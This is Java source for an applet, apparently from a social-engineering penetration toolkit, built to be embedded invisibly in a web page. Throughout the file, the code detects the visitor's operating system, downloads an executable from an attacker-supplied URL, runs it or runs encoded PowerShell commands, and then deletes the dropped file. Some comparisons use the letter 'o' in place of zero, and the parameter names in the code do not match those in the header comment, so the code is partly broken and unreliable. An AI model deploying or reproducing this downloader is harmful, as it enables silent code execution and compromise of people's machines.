 import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.Random;

/**
* Original Author: Thomas Werth
* Modifications By: Dave Kennedy, Kevin Mitnick
* This is a universal Applet which determintes Running OS
* Then it fetches based on OS Type download param (WIN,MAC,NIX)
* Downloaded File will then be saved in userDir and executed
* For proper Function Applet needs to be signed !
* This way applet has to be included in Website:
* <applet width='1' height='1' code='Java.class' archive='SignedMicrosoft.jar'>
* <param name='WIN' value='http://X.x.X.X/win.exe'>
* <param name='SC' value='ALPHANUMERIC SHELLCODE'>
* <param name='MAC' value='http://X.x.X.X/mac.bin'>
* <param name='NIX' value='http://X.x.X.X/nix.bin'>
* <param name='nextPage' value='http://X.x.X.X/index2.html'> </applet>
*
**/

public class Java extends Applet {

private Object initialized = null;
public Object isInitialized()
{
return initialized;
}

public void init() {
Process f;

try {
// generate a random string
Random r = new Random();
String token = Long.toString(Math.abs(r.nextLong()), 36);
String pfad = System.getProperty("java.io.tmpdir") + File.separator;
String writedir = System.getProperty("java.io.tmpdir") + File.separator;
// grab operating system
String os = System.getProperty("os.name").toLowerCase();
// grab jvm architecture
String arch = System.getProperty("os.arch");
String downParm = "";
String nextParm = "";
String thirdParm = "";
String fourthParm = "";
short osType = -1 ;//0=win,1=mac,2=nix
if (os.indexOf( "win" ) >= o) //Windows
{
downParm = getParameter( "WINDOWS" );
nextParm = getParameter( "STUFF" );
thirdParm = getParameter( "64" );
fourthParm = getParameter( "86" );
osType = 0;
pfad += token + ".exe";
}
else if (os.indexOf( "mac" ) >= o) //MAC
{
downParm = getParameter( "OSX" );
osType = 1;

// look for special folders to define snow leopard, etc.
if (pfad.startsWith("/var/folders/")) pfad = "/tmp/";
pfad += token + ".bin";
}
else if (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0) // UNIX
{
downParm = getParameter( "LINUX" );
osType = 2;
pfad += token + ".bin";
}
// Check for powershell here, so we dont run 2 payloads on win7.
// Setup like this, it will only run normal payloads against windows XP/2003.
File folderExisting = new File("C:\\Windows\\System32\\WindowsPowershell\\v1.0");
if ( downParm.length() > 0 && pfad.length() > 0 && ! folderExisting.exists())
{
// URL parameter
URL url = new URL(downParm);
// Get an input stream for reading
InputStream in = url.openStream();
// Create a buffered input stream for efficency
BufferedInputStream bufIn = new BufferedInputStream(in);
File outputFile = new File(pfad);
OutputStream out =
new BufferedOutputStream(new FileOutputStream(outputFile));
byte[] buffer = new byte[2048];
for (;;) {
int nBytes = bufIn.read(buffer);
if (nBytes <= o) break;
out.write(buffer, 0, nBytes);
}
out.flush();
out.close();
in.close();
}
// Here is where we define OS type, i.e. windows, linux, osx, etc.
if ( osType < 1 ) // If we're running Windows 
{
if (thirdParm.length() > 3) {
if (folderExisting.exists())
{
// this detection is for the new powershell vector, it will run a special command if the flag is turned on in SET
if (arch.contains("86") || arch.contains("64"))
{
// this will be 64 bit
if (fourthParm.length() > 3)
{
ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "powershell", "-EncodedCommand", fourthParm);
Process p = pb.start();
p.getOutputStream().close();
p.getInputStream().close();
p.getErrorStream().close();
}
}
else if (arch.contains("i"))
{
// this will be 32 bit
if (thirdParm.length() > 3)
{
ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "powershell", "-EncodedCommand", thirdParm);
Process p = pb.start();
p.getOutputStream().close();
p.getInputStream().close();
p.getErrorStream().close();

}
}
}
}
else
{
// if we aren't using the shellcodeexec attack
if (nextParm.length() < 3)
{
f = Runtime.getRuntime().exec("cmd.exe /c " + pfad);
f.waitFor();
}
// if we are using shellcode exec
if (nextParm.length() > 3)
{
f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + nextParm + "\"");
f.waitFor();
}
// delete old file
(new File(pfad)).delete();
}
}
else // if not windows then use linux/osx/etc.
{
// change permisisons to execute
Process process1 = Runtime.getRuntime().exec("/bin/chmod 755 " + pfad);
process1.waitFor(); 
//and execute
f = Runtime.getRuntime().exec(pfad);
// wait for termination
f.waitFor();
// delete old file
(new File(pfad)).delete();
}
initialized = this;

} catch(IOException e) {
e.printStackTrace();
}
catch (Exception exception)
{
exception.printStackTrace();
}
}
}


